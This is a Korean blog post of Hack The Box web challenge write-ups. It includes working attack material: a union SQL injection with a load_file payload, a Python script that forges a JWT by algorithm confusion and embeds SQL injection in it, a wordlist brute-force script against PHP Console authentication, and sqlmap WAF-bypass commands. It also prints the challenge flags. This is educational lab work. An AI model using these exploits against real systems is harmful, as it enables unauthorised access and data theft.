---
layout: post
title:  "[HTB] - Web Chall"
date:   2020-09-24
categories: ["2020","web hacking"]
update:   2020-09-24
comment: true
tags: [web]
---

## HTB WEB CHALL

### 1 Emdee five for life

걍 스크립트 돌리면 됨.

``` PYTHON
import requests
import hashlib

url="http://docker.hackthebox.eu:31511/"

req=requests.session()

get=req.get(url)
target_string=get.text.split("<h3 align='center'>")[1].split("</h3>")[0]
print (target_string)
hash_string=hashlib.md5(target_string.encode('utf-8')).hexdigest()
data={
    "hash": hash_string
}
post=req.post(url,data=data)
print (post.text)
```

### 2 FreeLancer

처음에는 contact_me.js 파일에서 firstname을 html 페이지에 그대로 포함시키길래 **reflected XSS**를 이용하는 건 줄 알았는데 우선 시작부터 찜찜했음. XSS는 클라이언트 쪽 취약점인데 서버에 있는 FLAG를 어케 가져오지? 라는 생각을 하면서 계속 하다가 결국 안 됐음. 태그가 텍스트 자체로 표시됨.

그래서 다른 곳을 살펴보다가 `portfolio.php`파일에서 id를 get방식으로 받고, 거기서 sql injection 이 발생.

union select null,null, ... 을 이용해서 몇 개의 컬럼 선택하는 지 확인 &#10142; table 명 확인 &#10142; 컬럼명 확인 &#10142; 

safeadm / $2y$10$s2ZCi/tHICnA97uf4MfbZuhmOZQXdCnrM9VM9LBMHPp68vAXNRf4K 확인

비번을 크랙할까 생각하다가 `dirb` 툴을 사용해 확인한 `/administrat/panel.php`를 읽어보기로 함.

서버가 아파치임을 확인했기 때문에 mysql에서 사용하는 `load_file`함수를 이용해서 파일 읽어올 수 있음.

 ```
UNION%20ALL%20SELECT%20NULL,NULL,load_file(%27/var/www/html/administrat/panel.php%27)
 ```

`sqlmap` 툴의 옵션 중에 `--file-read`라는 옵션으로 파일을 읽어오는 게 있는데 아마 `load_file`을 이용해 읽어오는 것 같음.

그 파일 안에 flag가 있다!

### 3 Under Construction

아이디를 등록하고 로그인하면 jwt를 쿠키로 준다. base64 decode 해보면 안에 username, public key가 포함되어 있다. 
근데 알고리즘이 RS256이라 private key를 알지 못하면 서명을 위조할 수가 없다.

그래서 알고리즘을 HS256으로 바꾸면 대칭키 알고리즘(rsa 공개키로)을 사용하기 때문에 주어진 public key를 이용해 서명을 위조할 수 있다.

&#10071; https://www.nccgroup.com/uk/about-us/newsroom-and-events/blogs/2019/january/jwt-attack-walk-through/

서명을 위조하면, 다른 사용자로 인증할 수 있는데, 결국 flag를 읽어야 한다. 코드를 보면 `DBHelper.js`에서 `getUser`를 통해 얻은 username을 이용해  `index.html`을 렌더링 해준다. 

다른 함수들에는 sqlite3 placeholder(`?`)를 써서 sql injection을 막았는데, 이 함수에서는

```
`SELECT * FROM users WHERE username = '${username}'`
```

이렇게 써서 sql injection이 가능하다. 

이 문제의 흐름은 다음과 같다:

 `checkUser`  -> 없으면 `createUser` -> `getUser`로 JWT에 있는 username을 이용해 user 확인 후, 화면에 렌더링.

`checkUser`랑 `createUser`에는 sql injection을 막아놨지만 `getUser`에는 안 막아놨다.

위의 쿼리문을 보면 `SELECT * FROM` ~ 이런식으로 해놔서 users 테이블에 column이 몇 개인지 모른다. UNION SELECT를 해주려면 컬럼 갯수가 같게 SELECT를 해야 해서 우선 column 갯수부터 알아야 한다. -> `order by` 사용

그리고 아마 UNION SELECT 할 때 컬럼 갯수 말고도 컬럼 타입도 같아야 하는 걸로 알고 있는데, 그걸 위해 null을 쓰면 된다.

그러면 컬럼 갯수가 3개인 거 확인가능하고 이제 username 컬럼의 순서를 확인해야 한다. 그래야 union select 할 때 우리가 원하는 값을 첫 번째 컬럼에서 받을 것인지, 두 번째, 세 번째에서 받을 지 정할 수 있다. 걍 3번 해보면 되니까 2번째인 거 확인가능하다.

그리고 우리가 원하는 컬럼(sqlite_master의 컬럼들)을 select 해야 하는데 username을 `getUser`에서 쓰기 때문에 `SELECT 1 as username`이렇게 별칭을 지정해줘서 select 하면 된다. 

그렇게 해서 테이블 정보, 컬럼 정보까지 찾다보면 `flag_store`이라는 테이블이 있고, `top_secret_flaag`라는 컬럼이 있어서 거기 있는 값을 가져오면 해결!



마지막 단계에서 원치 않은 테이블명이나 컬럼명이 나올 수도 있는데, `db.get`이 한 row만 가져와서 그런 거일듯?

그래서 `limit` 적당히 사용해주면 될 거 같다.

이제 알았는데 github에 올려져있는 writeup 보려면 flag를 알아야 한다.

**UnderConstruction.py**:

``` python
import base64
import binascii
import time
import jwt
import hashlib
import hmac
import json
import requests


# -------------------------token_part-------------------------
# change algo from RS256 to HS256
# and make fake signature <= base64(hmac-sha256(header+payload))

public_key="""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA95oTm9DNzcHr8gLhjZaY
ktsbj1KxxUOozw0trP93BgIpXv6WipQRB5lqofPlU6FB99Jc5QZ0459t73ggVDQi
XuCMI2hoUfJ1VmjNeWCrSrDUhokIFZEuCumehwwtUNuEv0ezC54ZTdEC5YSTAOzg
jIWalsHj/ga5ZEDx3Ext0Mh5AEwbAD73+qXS/uCvhfajgpzHGd9OgNQU60LMf2mH
+FynNsjNNwo5nRe7tR12Wb2YOCxw2vdamO1n1kf/SMypSKKvOgj5y0LGiU3jeXMx
V8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr
0wIDAQAB
-----END PUBLIC KEY-----
""" # last \n(0x0a) is needed!!! 

now=int(time.time())

header={
    "alg":"HS256",
    "typ":"JWT"
}

payload={
    "username": "gues' UNION SELECT NULL,top_secret_flaag as username,NULL from flag_storage-- ",    #Using username, we can fake identity and sql injection
    "pk":public_key,
    "iat": now
}

jwt_header=base64.b64encode(json.dumps(header).replace(" ","").encode()).decode().replace('=','') # make jwt_header
jwt_payload=base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().replace('=','') # make jwt_payload

to_sign=bytes(jwt_header+"."+jwt_payload, 'utf-8') # we will make signature using this

#hex_key=binascii.hexlify(public_key.encode()) 

signature=hmac.new(public_key.encode(),to_sign,hashlib.sha256).hexdigest() # make hmac-sha256
signature=binascii.a2b_hex(signature)
signature=base64.urlsafe_b64encode(signature).decode().replace('=','') # signature -> base64

token=jwt_header+"."+jwt_payload+"."+signature

print ("token: "+token)

# -------------------------request_part-------------------------
url="http://docker.hackthebox.eu:30457/"
auth_url="http://docker.hackthebox.eu:30457/auth"

data={
    "username": "admin",
    "password": "admin"
}

cookies={
    "session":token
}	#Broken Authenticate

req=requests.session()

post=req.post(auth_url,data)
post_content=post.text.split('<div class="card-body">')[1].split("<br>")[0]
print(post_content,post.url)

req=requests.session()

get=req.get(url,cookies=cookies)
get_content=get.text.split('<div class="card-body">')[1].split("<br>")[0]

print (get_content,get.url)
```

```
PS C:\Users\a\Desktop\HTB> python .\UnderConstruction.py
token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ICJndWVzJyBVTklPTiBTRUxFQ1QgTlVMTCx0b3Bfc2VjcmV0X2ZsYWFnIGFzIHVzZXJuYW1lLE5VTEwgZnJvbSBmbGFnX3N0b3JhZ2UtLSAiLCAicGsiOiAiLS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS1cbk1JSUJJakFOQmdrcWhraUc5dzBCQVFFRkFBT0NBUThBTUlJQkNnS0NBUUVBOTVvVG05RE56Y0hyOGdMaGpaYVlcbmt0c2JqMUt4eFVPb3p3MHRyUDkzQmdJcFh2NldpcFFSQjVscW9mUGxVNkZCOTlKYzVRWjA0NTl0NzNnZ1ZEUWlcblh1Q01JMmhvVWZKMVZtak5lV0NyU3JEVWhva0lGWkV1Q3VtZWh3d3RVTnVFdjBlekM1NFpUZEVDNVlTVEFPemdcbmpJV2Fsc0hqL2dhNVpFRHgzRXh0ME1oNUFFd2JBRDczK3FYUy91Q3ZoZmFqZ3B6SEdkOU9nTlFVNjBMTWYybUhcbitGeW5Oc2pOTndvNW5SZTd0UjEyV2IyWU9DeHcydmRhbU8xbjFrZi9TTXlwU0tLdk9najV5MExHaVUzamVYTXhcblY4V1MrWWlZQ1U1T0JBbVRjejJ3Mmt6QmhaRmxINlJLNG1xdWV4SkhyYTIzSUd2NVVKNUdWUEVYcGRDcUszVHJcbjB3SURBUUFCXG4tLS0tLUVORCBQVUJMSUMgS0VZLS0tLS1cbiIsICJpYXQiOiAxNTk3MjUyODU2fQ.4KVYOLw_fN77OsCAZq_daRhrGrPoa-_-FB4vxu4uPpg

                    Welcome admin http://docker.hackthebox.eu:30457/

                    Welcome HTB{d0n7_3xp053_y0ur_publ1ck3y} http://docker.hackthebox.eu:30457/
```

:checkered_flag: **HTB{d0n7_3xp053_y0ur_publ1ck3y}**

### 4 Console

문제 드가보면

```
PHP Version 7.2.28
Your IP is 10.255.0.2

Make sure to load php-console in order to be prompted for a password
```

라고 한다. PHP Console이라고 검색해보니까 구글 확장 프로그램이 있어서 설치했다.  설치하면 인증을 위해 비밀번호를 입력하라고 한다. github에 코드가 올라와있다.

**src/Auth.php :**

``` php
const PASSWORD_HASH_SALT = 'NeverChangeIt:)';
public function __construct($password, $publicKeyByIp = true) {
		$this->publicKeyByIp = $publicKeyByIp;
		$this->passwordHash = $this->getPasswordHash($password);
	}
	protected final function getPasswordHash($password) {
		return $this->hash($password . self::PASSWORD_HASH_SALT);
	}
	public final function isValidAuth(ClientAuth $clientAuth) {
		return $clientAuth->publicKey === $this->getPublicKey() && $clientAuth->token === $this->getToken();
	}
protected function getClientUid() {
		$clientUid = '';
		if($this->publicKeyByIp) {
			if(isset($_SERVER['REMOTE_ADDR'])) {
				$clientUid .= $_SERVER['REMOTE_ADDR'];
			}
			if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
				$clientUid .= $_SERVER['HTTP_X_FORWARDED_FOR'];
			}
		}
		return $clientUid;
	}

	/**
	 * Get authorization session public key for current client
	 * @return string
	 */
	protected function getPublicKey() {
		return $this->hash($this->getClientUid() . $this->passwordHash);
	}

	/**
	 * Get string signature for current password & public key
	 * @param $string
	 * @return string
	 */
	public final function getSignature($string) {
		return $this->hash($this->passwordHash . $this->getPublicKey() . $string);
	}

	/**
	 * Get expected valid client authorization token
	 * @return string
	 */
	private final function getToken() {
		return $this->hash($this->passwordHash . $this->getPublicKey());
	}
```

PHP Console 확장 프로그램에 비밀번호를 입력해서 보내면 Response 헤더에 다음과 같은 내용이 추가되어 돌아온다:

```
PHP-Console: {"protocol":5,"auth":{"publicKey":"d1d58b2f732fd546d9507da275a71bddc0c2300a214af3f3f3a5f5f249fe275e","isSuccess":false},"docRoot":null,"sourcesBasePath":null,"getBackData":null,"isLocal":null,"isSslOnlyMode":false,"isEvalEnabled":null,"messages":[]}
```

`passwordHash`는 `password`와 `PASSWORD_HASH_SALT`값을 concat한 값을 SHA256 hash 해서 얻는다. 

내 IP를 이용해 `$clientUID`를 얻고,  그 값과 `passwordHash`를 concat한 값을 SHA256 hash를 해서 public key를 얻는다.

`passwordHash`와 위에서 얻은 `public key`를 concat한 값을 SHA256 hash해서 token을 만든다.

PHP Console 확장 프로그램에 비밀번호를 입력해서 보내면 요청헤더에는 다음과 같은 게 포함된다:

```
php-console-client=eyJwaHAtY29uc29sZS1jbGllbnQiOjUsImF1dGgiOnsicHVibGljS2V5IjoiZDFkNThiMmY3MzJmZDU0NmQ5NTA3ZGEyNzVhNzFiZGRjMGMyMzAwYTIxNGFmM2YzZjNhNWY1ZjI0OWZlMjc1ZSIsInRva2VuIjoiNzJhYmIzZmE5MmE2OGFhZDExZGM2M2JkMDkyMjg3NWI3NmZkMjM2NDI1OGE5YTgyNDZmNjYzNzE0YzBiOTI5NyJ9fQ==
```

bash 64 디코딩 :

```json
{"php-console-client":5,"auth":{"publicKey":"d1d58b2f732fd546d9507da275a71bddc0c2300a214af3f3f3a5f5f249fe275e","token":"72abb3fa92a68aad11dc63bd0922875b76fd2364258a9a8246f663714c0b9297"}}
```

`publicKey`가 똑같은걸 알 수 있고, `token`을 보낸다. 올바른 `token`을 보내야 인증이 성공하는 것 같다.

위의 코드에서 `token`은 `passwordHash`와 `publicKey`를 합쳐 만든다:

```
SHA256(SHA256(password+"+")+publicKey)
```

password만 맞추면 되니까, brute force해 볼 수 있을 것 같다.

**console.py**

``` python
import requests
import hashlib
import base64
import json

url="http://docker.hackthebox.eu:30335"
publicKey="d1d58b2f732fd546d9507da275a71bddc0c2300a214af3f3f3a5f5f249fe275e"

f=open("/usr/share/wordlists/rockyou.txt","r")

while True:
    line=f.readline().strip("\n")
    password=line+"NeverChangeIt:)"
    passwordHash=hashlib.sha256(password.encode()).hexdigest()
    token=hashlib.sha256((passwordHash+publicKey).encode()).hexdigest()
    php_client={"php-console-client":5,"auth":{"publicKey":publicKey,"token":token}}
    php_client_encoded=base64.b64encode(json.dumps(php_client).encode()).decode()
    cookies={
            "php-console-server":"5",
            "php-console-client":php_client_encoded
            }
    req=requests.get(url,cookies=cookies)
    response=req.headers['PHP-Console']
    php_console=json.loads(response)
    result=php_console['auth']['isSuccess']
    print ("result: "+str(result))
    if result !=False:                                                  
        print(line)                                      
        break                                                                                                                                                  
print ("Crack Complete! Password is "+password.split("N")[0])      
```

처음에 cookies의 `php-console-server`에 값을 그냥 숫자형 5로 줬는데 에러가 났다.

``` python
self.non_word_re.search(cookie.value) and version > 0):
```

`/usr/lib/python2.7/cookielib.py`에서 에러가 난 부분이 여기다.

검색해보니 `re.search()`함수의 매개변수는 `str`이어야 한다. 한 수 배웠다..

```
...
result: False
result: False
result: False
result: False
result: False
result: False
result: False
result: False
result: False
result: False
result: False
result: False
result: False
result: False
result: False
result: False
result: False
result: False
result: False
result: True
poohbear
Crack Complete! Password is poohbear
```

password에 `poohbear`입력하면 로그인이 되고, console에 flag가 있다.

:checkered_flag: **HTB{PhP!Cons0lE@ByTh3K+FoUnd+}**

### 5. wafwaf

``` php
<?php error_reporting(0);
require 'config.php';

class db extends Connection {
    public function waf($s) {
        if (preg_match_all('/'. implode('|', array(
            '[' . preg_quote("(*<=>|'&-@") . ']',
            'select', 'and', 'or', 'if', 'by', 'from', 
            'where', 'as', 'is', 'in', 'not', 'having'
        )) . '/i', $s, $matches)) die(var_dump($matches[0]));
        return json_decode($s);
    }

    public function query($sql) {
        $args = func_get_args();
        unset($args[0]);
        return parent::query(vsprintf($sql, $args));
    }
}

$db = new db();

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $obj = $db->waf(file_get_contents('php://input'));
    $db->query("SELECT note FROM notes WHERE assignee = '%s'", $obj->user);
} else {
    die(highlight_file(__FILE__, 1));
}
?>
```

문제와는 상관없지만 대충 느낌상 넘어갔던 코드들을 살짝만 정리해보자.

`db` 클래스가 자식클래스, `Connection`이 부모 클래스. `db`클래스를 `Connection` 클래스에 상속시켰다.

클래스 내부에서 메소드와 프로퍼티를 정의할 때 **접근 제어자**를 사용할 수 있다.

- **public** - 클래스 외부에서 접근 가능
- **protected** - 클래스 내부 + 상속받은 클래스에서 접근 가능
- **private** - 클래스 내부에서만 접근 가능

`parent::` 키워드는 자식과 부모가 같은 이름의 메소드를 가지고 있을 때, 부모의 메소드를 호출할 때 쓴다.

`waf()` 메소드는 `json_decode('php://input')` 을 리턴한다. `php://input`을 이용해 request body에 있는 raw data를 읽고, `json_decode`를 이용해 JSON 형태의 문자열을 object 형태로 변환한다.

> ❗ `php://input` is a read-only stream that allows you to read raw data from the request body.



그 object의 user필드에 해당하는 값을 추출해 쿼리문에 삽입한다. 여기서 SQL Injection이 발생하는데, `waf()`를 우회할 필요가 있다.

여러가지 시도해보다가 local에서 **Mysql** DB를 대상으로 escape된 unicode encoding이 먹히는 것을 확인했다.

입력을 보내니까 아무런 응답도 안온다.. 그래서 time based blind sql injection를 시도해야겠다고 생각하고 `sqlmap`을 돌렸다. POST 형식으로 보내는 요청의 body에 내가 원하는 인젝션 포인트가 있기 때문에 평소와는 좀 다르게 썼다.

**Raw.txt**

```
POST / HTTP/1.1
Content-Type: application/json
Host: docker.hackthebox.eu:30616
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
Content-Length: 21

{
	"user":"bbang"
}
```

```bash
$ sqlmap.py -r Raw.txt --tamper=charunicodeescape --technique=T --dbs --dbms=mysql
// Raw.txt에서 인젝션 포인트를 찾아 문자를 \u0027 형태로 바꿔주고 time-based blind sql injection을 수행해서 Database들을 확인한다.
$ sqlmap.py -r Raw.txt --tamper=charunicodeescape --technique=T --dbms=mysql --time-sec=2 --tables -D db_m8452
// 그 중에서 db_m8452라는 DB에 있는 테이블들을 나열한다.
$ sqlmap.py -r Raw.txt --tamper=charunicodeescape --technique=T --dbms=mysql --time-sec=2 --dump -T definitely_not_a_flag
// 확인한 DB에서 definitely_not_a_flag라는 테이블의 내용을 dump한다. 그 안에 플래그가 있다.
```

`sqlmap`을 쓸 때 많이 쓰는 옵션들:

- -h, --help
  도움말 출력
- -u URL, --url=URL
  타켓 URL (e.g. "http://www.site.com/vuln.php?id=1")
- -g GOOGLEDORK
  Google Dork 검색을 통한 타겟 선정
- --data=DATA
  POST타입으로 보낼때 데이터 지정 (e.g. "id=1")
- --cookie=COOKIE
  HTTP Cookie header value 지정 (e.g. "PHPSESSID=a8d127e..")
- --random-agent
  랜덤한 HTTP User-Agent header value 사용
- --proxy=PROXY
  PROXY 사용
- --tor
  익명 tor서버 사용
- --check-tor
  tor 서버 체크
- -p TESTPARAMETER
  테스트 가능한 매개변수
- --level=LEVEL
  테스트 쓰레드 속도 설정 (1-5, default 1)
- --risk=RISK
  리스크 설정 (1-3, default 1)
- -a, --all
  모든 것을 검색
- -b, --banner
  DBMS 배너 확인
- --current-user
  DBMS user 확인
- --current-db
  DBMS db 확인
- --passwords
  DBMS password hash 값 확인
- --dbs
  Database 확인
- --tables
  DBMS tables 확인
- --columns
  DBMS columns 확인
- --schema
  DBMS schema 확인
- --dump
  DBMS data 조회
- --dump-all
  DBMS 내의 모든 data 조회
- -D DB
  DB 지정
- -T TBL
  TABLE 지정
- -C COL
  COLUMN 지정

> 🚀참고
>
> https://jaeseokim.tistory.com/21

`--tamper`옵션에는 페이로드를 인코딩, 변경할 수 있는 방법을 지정할 수 있다.

아래의 링크에서 내가 원하는 형태로 변경해주는 방법인 `charunicodeescape`를 선택했다.

> 🚀참고
>
> https://medium.com/@pentesta/all-sqlmap-tamper-scripts-2019-f91a07e1b4f1

time-based blind sql injection인 걸 알았을 때 스크립트를 짤까 생각했지만 너무 오래걸릴 것 같아서 그냥 `sqlmap`을 썼다. `sqlmap` 의 옵션들을 잘 활용하는 것도 중요할 것 같다 😊

예를 들어서 `--tamper` 옵션에 너무 많은 옵션을 주는 건 딱히 좋지 않고, `--technique`과 `--dbms`를 지정해주면 좀 더 빠르게 `sqlmap`을 돌릴 수 있다.

```
[1 entry]
+-----------------------------------+
| flag                              |
+-----------------------------------+
| HTB{w4f_w4fing_my_w4y_0utt4_h3r3} |
+-----------------------------------+
```

🏁**flag : HTB{w4f_w4fing_my_w4y_0utt4_h3r3} **

